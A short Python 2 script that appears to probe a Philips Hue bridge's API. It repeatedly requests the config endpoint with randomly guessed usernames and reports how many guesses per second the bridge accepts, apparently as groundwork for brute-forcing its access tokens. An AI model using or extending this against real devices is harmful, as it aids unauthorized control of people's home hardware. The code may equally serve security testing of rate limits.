from pprint import pprint
import string
import random
import time

import requests
import discover

s = requests.Session()
s.headers = {}  # make our packet smaller. The server ignores headers
hue_url = discover.find_hue()
#username = 1c25a48511e41087b579651102bf5b3
count = 0
start_time = time.time()
interval = time.time()
while True:
    username = random.choice(string.hexdigits[:16])  # ignore uppercase
    res = s.get(hue_url + 'api/{}/config'.format(username),
                headers={'User-Agent': 'requests'})
    #pprint(res.json())
    count += 1
    if count % 100 == 0:
        now = time.time()
        elapsed = now - start_time
        print count, elapsed, 100 / (now - interval)
        interval = now
